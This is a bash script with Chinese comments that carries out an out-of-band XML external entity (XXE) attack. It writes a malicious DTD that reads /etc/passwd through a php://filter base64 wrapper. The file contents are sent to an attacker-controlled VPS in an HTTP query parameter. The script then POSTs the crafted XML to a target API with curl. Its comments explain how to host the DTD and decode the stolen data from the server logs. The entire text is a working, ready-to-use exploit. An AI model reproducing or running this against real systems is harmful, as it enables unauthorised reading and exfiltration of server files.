#!/usr/bin/env bash
TARGET="${1:?usage: bash xxe-oob.sh http://TARGET/api/xml <VPS>}"
VPS="${2:?usage: bash xxe-oob.sh http://TARGET/api/xml <VPS>}"
# VPS 上准备 /evil.dtd（用 python -m http.server 9000 提供）
cat > runs/evil.dtd <<DTD
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://$VPS:9000/?d=%file;'>">
%eval;
%exfil;
DTD
cat > runs/xxe-oob.xml <<XML
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://$VPS:9000/evil.dtd"> %dtd;]>
<r>probe</r>
XML
curl -sS -m 12 -X POST "$TARGET" -H 'Content-Type: application/xml' --data-binary @runs/xxe-oob.xml -o /dev/null -w 'sent=%{http_code}\n'
echo "把 runs/evil.dtd 放到 $VPS:9000 根目录（python3 -m http.server 9000），再看访问日志里的 ?d="
# 判定：日志出现 ?d=cm9vd...（base64）→ base64 -d 即 /etc/passwd
